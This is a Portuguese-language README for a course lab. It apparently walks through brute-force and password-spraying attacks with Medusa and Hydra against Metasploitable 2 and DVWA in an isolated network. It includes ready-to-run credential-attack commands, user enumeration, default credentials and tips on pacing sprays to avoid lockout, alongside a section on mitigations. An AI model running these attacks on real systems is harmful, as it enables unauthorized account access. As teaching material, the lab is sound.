# 🔐 Laboratório de Ataques de Força Bruta com Kali Linux e Medusa

> Projeto prático de segurança ofensiva simulando ataques de **força bruta** e **password spraying** contra ambientes deliberadamente vulneráveis (**Metasploitable 2** e **DVWA**), com foco em auditoria de credenciais e **medidas de mitigação**.
>
> Desafio da trilha de Segurança da Informação — **Digital Innovation One (DIO)**.

![Kali Linux](https://img.shields.io/badge/Kali%20Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![Medusa](https://img.shields.io/badge/Medusa-Brute%20Force-red?style=for-the-badge)
![VirtualBox](https://img.shields.io/badge/VirtualBox-183A61?style=for-the-badge&logo=virtualbox&logoColor=white)
![Licença](https://img.shields.io/badge/uso-educacional-green?style=for-the-badge)

---

## ⚠️ Aviso Legal e Ético

Todo o conteúdo deste repositório foi produzido **exclusivamente para fins educacionais**, em um **ambiente de laboratório isolado**, com máquinas virtuais criadas pelo próprio autor para esse propósito.

- ✅ **Permitido:** testar os próprios sistemas, em redes isoladas, com autorização.
- ❌ **Proibido:** executar estas técnicas contra sistemas, redes ou serviços de terceiros sem **autorização formal e por escrito**.

> O acesso não autorizado a sistemas de informação é **crime** no Brasil (Lei nº 12.737/2012 — "Lei Carolina Dieckmann" — e Art. 154-A do Código Penal). O autor não se responsabiliza pelo mau uso das informações aqui contidas.

---

## 📑 Índice

1. [Objetivos de Aprendizagem](#-objetivos-de-aprendizagem)
2. [Conceitos Fundamentais](#-conceitos-fundamentais)
3. [Arquitetura do Laboratório](#-arquitetura-do-laboratório)
4. [Montagem do Ambiente](#-montagem-do-ambiente)
5. [Reconhecimento com Nmap](#-reconhecimento-com-nmap)
6. [Cenário 1 — Força Bruta no FTP](#-cenário-1--força-bruta-no-ftp)
7. [Cenário 2 — Força Bruta no Formulário Web (DVWA)](#-cenário-2--força-bruta-no-formulário-web-dvwa)
8. [Cenário 3 — Password Spraying no SMB](#-cenário-3--password-spraying-no-smb)
9. [Validação dos Acessos](#-validação-dos-acessos)
10. [Medidas de Mitigação](#-medidas-de-mitigação)
11. [Estrutura do Repositório](#-estrutura-do-repositório)
12. [Reflexões e Aprendizados](#-reflexões-e-aprendizados)
13. [Referências](#-referências)

---

## 🎯 Objetivos de Aprendizagem

Ao concluir este laboratório, foram exercitadas as competências de:

- Compreender ataques de **força bruta** em diferentes serviços (FTP, Web/HTTP e SMB);
- Utilizar o **Kali Linux** e o **Medusa** para auditoria de credenciais em ambiente controlado;
- Diferenciar **brute force** de **password spraying** e entender quando cada técnica é aplicável;
- Realizar **enumeração de usuários** como etapa de reconhecimento;
- Documentar processos técnicos de forma **clara, estruturada e reproduzível**;
- Reconhecer vulnerabilidades comuns de autenticação e propor **medidas de mitigação**;
- Utilizar o **GitHub** como portfólio técnico.

---

## 📚 Conceitos Fundamentais

### O que é um ataque de força bruta?
Técnica que tenta **adivinhar credenciais** testando sistematicamente combinações de usuário e senha até encontrar uma válida. É eficaz contra senhas fracas, curtas ou previsíveis e contra serviços sem proteção de limite de tentativas.

### Força Bruta × Password Spraying

| Característica | Força Bruta (clássica) | Password Spraying |
|---|---|---|
| Estratégia | Muitas **senhas** contra **1 usuário** | **1 senha** contra **muitos usuários** |
| Risco de bloqueio | Alto (dispara lockout rápido) | Baixo (poucas tentativas por conta) |
| Quando usar | Serviço sem política de lockout | Domínios/serviços com bloqueio de conta |
| Exemplo | 10.000 senhas no usuário `admin` | Senha `Outono2026!` em 500 usuários |

### O Medusa
Ferramenta de **brute force paralela, modular e rápida**, já incluída no Kali Linux. Suporta dezenas de protocolos (FTP, SSH, SMB, HTTP, MySQL, RDP, VNC...) através de módulos.

Parâmetros essenciais:

| Flag | Função |
|---|---|
| `-h` / `-H` | Host alvo / arquivo de hosts |
| `-u` / `-U` | Usuário único / arquivo de usuários |
| `-p` / `-P` | Senha única / arquivo de senhas |
| `-M` | Módulo do serviço (`ftp`, `smbnt`, `web-form`...) |
| `-t` | Threads/conexões paralelas |
| `-f` | Para no primeiro login válido por host |
| `-O` | Salva log em arquivo |
| `-n` | Porta customizada |

---

## 🗺️ Arquitetura do Laboratório

Duas máquinas virtuais em **rede isolada (Host-Only / Rede Interna)** no VirtualBox, sem acesso à internet — garantindo que os ataques nunca "vazem" para fora do lab.

```
            ┌───────────────────────────────────────────────┐
            │        Rede Host-Only  (192.168.56.0/24)       │
            │                                                 │
   ┌────────┴─────────┐                      ┌───────────────┴────────┐
   │   KALI LINUX     │                      │   METASPLOITABLE 2     │
   │   (Atacante)     │  ───  ataques  ───►  │   (Alvo vulnerável)    │
   │ 192.168.56.101   │   FTP / HTTP / SMB   │   192.168.56.102       │
   │                  │                      │   + DVWA (web)         │
   │  Medusa, Nmap,   │                      │   FTP(21) HTTP(80)     │
   │  enum4linux      │                      │   SMB(139,445)         │
   └──────────────────┘                      └────────────────────────┘
```

| Máquina | Papel | SO | IP (exemplo) |
|---|---|---|---|
| Kali Linux | Atacante | Kali Rolling | `192.168.56.101` |
| Metasploitable 2 | Alvo | Ubuntu 8.04 (vulnerável) | `192.168.56.102` |

> O **DVWA** já vem pré-instalado no Metasploitable 2 e também pode ser instalado isoladamente. Credencial padrão do DVWA: `admin / password`.

---

## 🛠️ Montagem do Ambiente

### 1. Pré-requisitos
- [VirtualBox](https://www.virtualbox.org/)
- [Kali Linux (imagem para VirtualBox)](https://www.kali.org/get-kali/)
- [Metasploitable 2](https://sourceforge.net/projects/metasploitable/)

### 2. Configurar a rede isolada
No VirtualBox, para **ambas** as VMs:

`Configurações` → `Rede` → `Conectado a:` → **Rede Interna** (ou **Host-Only Adapter**).

> Use a mesma nomenclatura de rede nas duas VMs (ex.: `intnet-lab`). Isso mantém o tráfego **somente entre elas**.

### 3. Verificar conectividade
No Kali:
```bash
ip a                       # descobre o IP da interface do lab
ping -c 3 192.168.56.102   # testa alcance ao alvo
```

### 4. Credenciais padrão do Metasploitable 2
- Login do sistema: `msfadmin / msfadmin`
- DVWA (web): `admin / password`

---

## 🔍 Reconhecimento com Nmap

Antes de atacar, identificamos **quais serviços estão expostos**.

```bash
nmap -sV -sC -p 21,80,139,445 192.168.56.102
```

| Flag | Significado |
|---|---|
| `-sV` | Detecta versão dos serviços |
| `-sC` | Executa scripts NSE padrão |
| `-p` | Define as portas |

**Saída esperada (resumo):**
```
PORT     STATE  SERVICE     VERSION
21/tcp   open   ftp         vsftpd 2.3.4
80/tcp   open   http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp  open   netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open   netbios-ssn Samba smbd 3.X - 4.X
```

> Script pronto: [`scripts/00-recon-nmap.sh`](scripts/00-recon-nmap.sh)

📸 *Sugestão de captura:* `images/01-nmap.png`

---

## 💥 Cenário 1 — Força Bruta no FTP

**Objetivo:** descobrir credenciais válidas do serviço FTP (porta 21).

```bash
medusa -h 192.168.56.102 \
       -U wordlists/usuarios.txt \
       -P wordlists/senhas.txt \
       -M ftp \
       -t 4 \
       -f \
       -O resultado_ftp.log
```

**Interpretando a saída:**
```
ACCOUNT CHECK: [ftp] Host: 192.168.56.102 User: msfadmin Password: 123456 (Incorrect)
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
```

- `ACCOUNT CHECK` → tentativa em andamento;
- `ACCOUNT FOUND ... [SUCCESS]` → **credencial válida encontrada!** 🎯

Filtrando apenas os sucessos:
```bash
grep "ACCOUNT FOUND" resultado_ftp.log
```

> Script pronto: [`scripts/01-brute-ftp.sh`](scripts/01-brute-ftp.sh)

📸 *Sugestão de captura:* `images/02-ftp-success.png`

---

## 🌐 Cenário 2 — Força Bruta no Formulário Web (DVWA)

**Objetivo:** automatizar tentativas de login no formulário da página *Brute Force* do DVWA.

### Preparação
1. Acesse `http://192.168.56.102/dvwa/` e faça login (`admin / password`).
2. Em **DVWA Security**, defina o nível como **Low** (sem token CSRF — ideal para aprendizado).
3. Capture o cookie **`PHPSESSID`** (DevTools → *Application* → *Cookies*).

### Ataque com Medusa (módulo `web-form`)
```bash
medusa -h 192.168.56.102 \
       -u admin \
       -P wordlists/senhas.txt \
       -M web-form \
       -m FORM:"/vulnerabilities/brute/index.php" \
       -m FORM-DATA:"get?username=admin&password=&Login=Login" \
       -m DENIED-MESSAGE:"Username and/or password incorrect" \
       -m COOKIE:"security=low; PHPSESSID=SEU_PHPSESSID_AQUI"
```

A lógica é dizer ao Medusa **qual mensagem aparece quando a senha está errada** (`DENIED-MESSAGE`). Tudo que **não** retornar essa mensagem é tratado como possível sucesso.

### Alternativa com Hydra
No DVWA, o **Hydra** costuma ser mais previsível para formulários web:
```bash
hydra -l admin -P wordlists/senhas.txt 192.168.56.102 http-get-form \
"/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect:H=Cookie: security=low; PHPSESSID=SEU_PHPSESSID"
```

> Script pronto: [`scripts/02-brute-dvwa.sh`](scripts/02-brute-dvwa.sh)

📸 *Sugestão de captura:* `images/03-dvwa-form.png`

---

## 📡 Cenário 3 — Password Spraying no SMB

**Objetivo:** enumerar usuários via SMB e aplicar **uma senha por rodada** contra todos eles — evitando o bloqueio de contas.

### Etapa 1 — Enumeração de usuários
```bash
enum4linux -U 192.168.56.102
# ou a versão mais recente:
enum4linux-ng -U 192.168.56.102
```
Isso revela usuários locais, compartilhamentos e políticas de senha.

### Etapa 2 — Password spraying com Medusa (módulo `smbnt`)
Testa **uma senha** contra **a lista inteira de usuários**:
```bash
medusa -h 192.168.56.102 \
       -U wordlists/usuarios.txt \
       -p "Outono2026!" \
       -M smbnt \
       -t 1 \
       -O resultado_smb.log
```

> **Boa prática ética de spray:** aguarde um intervalo entre as rodadas de senha para respeitar janelas de lockout — exatamente o que um atacante real faria para não ser bloqueado, e o que o defensor precisa detectar.

O script automatiza o laço "1 senha → todos os usuários" para cada senha do arquivo de spray:

> Script pronto: [`scripts/03-password-spray-smb.sh`](scripts/03-password-spray-smb.sh)

📸 *Sugestão de captura:* `images/04-smb-enum.png`

---

## ✅ Validação dos Acessos

Encontrar a credencial é só metade do trabalho — é preciso **provar** que ela funciona.

**FTP:**
```bash
ftp 192.168.56.102
# Name: msfadmin   Password: msfadmin
# 230 Login successful.
```

**SMB (listar compartilhamentos com a credencial descoberta):**
```bash
smbclient -L //192.168.56.102 -U msfadmin
```

**DVWA:** efetue o login manualmente no navegador com a senha encontrada e confirme o acesso à área autenticada.

📸 *Sugestão de captura:* `images/05-validacao.png`

---

## 🛡️ Medidas de Mitigação

A documentação de um ataque só tem valor se vier acompanhada da **defesa**. Como proteger cada serviço:

### Gerais (todos os serviços)
- **Senhas fortes:** mínimo 12–14 caracteres, com complexidade; proibir senhas comuns (checar contra listas vazadas, ex.: *HaveIBeenPwned*).
- **MFA / 2FA:** autenticação multifator neutraliza a maioria dos ataques de credencial.
- **Política de lockout:** bloquear a conta após N tentativas falhas (ex.: 5 em 15 min).
- **Rate limiting / throttling:** atrasar progressivamente novas tentativas.
- **Monitoramento e alertas (SIEM):** detectar picos de falhas de login e múltiplos usuários com a mesma senha (indício de *spray*).
- **Princípio do menor privilégio** e remoção de contas padrão/inativas.

### FTP
- Substituir FTP por **SFTP/FTPS** (FTP é texto puro).
- Desabilitar login anônimo; restringir por IP (allowlist).
- Usar **Fail2Ban** para banir IPs após falhas repetidas.

### Aplicação Web (DVWA / formulários)
- **CAPTCHA** após X tentativas; tokens **anti-CSRF**.
- Lockout por usuário **e** por IP; mensagens de erro genéricas (não revelar se o usuário existe).
- **WAF** e cabeçalhos de segurança.

### SMB
- Desabilitar **SMBv1**; exigir **assinatura SMB**.
- Não expor SMB à internet (bloquear 139/445 na borda).
- Política de lockout de domínio para conter *password spraying*.
- Auditar eventos de logon (Event ID 4625) e correlacionar no SIEM.

---

## 📂 Estrutura do Repositório

```
medusa-brute-force-lab/
├── README.md                     # Esta documentação
├── wordlists/
│   ├── usuarios.txt              # Lista de usuários de exemplo
│   ├── senhas.txt                # Lista de senhas de exemplo
│   └── senha-spray.txt           # Senhas para password spraying
├── scripts/
│   ├── 00-recon-nmap.sh          # Reconhecimento de portas/serviços
│   ├── 01-brute-ftp.sh           # Força bruta FTP
│   ├── 02-brute-dvwa.sh          # Força bruta formulário web DVWA
│   └── 03-password-spray-smb.sh  # Enumeração + spray SMB
├── images/                       # Capturas de tela (evidências)
└── docs/
    └── guia-de-evidencias.md     # O que capturar em cada etapa
```

### Como usar os scripts
```bash
git clone https://github.com/SEU-USUARIO/medusa-brute-force-lab.git
cd medusa-brute-force-lab/scripts
chmod +x *.sh
./00-recon-nmap.sh 192.168.56.102
./01-brute-ftp.sh  192.168.56.102
```

---

## 💭 Reflexões e Aprendizados

- A **senha fraca é a verdadeira vulnerabilidade** — a ferramenta só a expõe. O `msfadmin/msfadmin` cai em segundos justamente por ser previsível.
- **Enumeração vale ouro:** descobrir usuários válidos antes de atacar reduz drasticamente o esforço e torna o *password spraying* viável.
- **Força bruta é barulhenta:** gera um rastro enorme de falhas de login. Isso é ótimo para o **defensor**, que pode detectá-la facilmente com monitoramento adequado — por isso lockout + SIEM são tão eficazes.
- Escolher a técnica certa importa: contra serviços com lockout, o **spray** é muito mais furtivo que a força bruta clássica.
- Documentar cada passo transforma um teste isolado em **conhecimento reproduzível** — a essência do trabalho de segurança.

---

## 📖 Referências

- [Kali Linux — Site Oficial](https://www.kali.org/)
- [Medusa — Documentação (Foofus)](http://www.foofus.net/jmk/medusa/medusa.html)
- [DVWA — Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
- [Metasploitable 2 — Guia de exploração (Rapid7)](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [Nmap — Manual Oficial](https://nmap.org/book/)
- [OWASP — Blocking Brute Force Attacks](https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks)
- [Lei nº 12.737/2012 — Crimes informáticos](http://www.planalto.gov.br/ccivil_03/_ato2011-2014/2012/lei/l12737.htm)

---

<div align="center">

**Projeto desenvolvido para o desafio da [Digital Innovation One (DIO)](https://www.dio.me/)**

⭐ Se este material foi útil, deixe uma estrela no repositório!

</div>
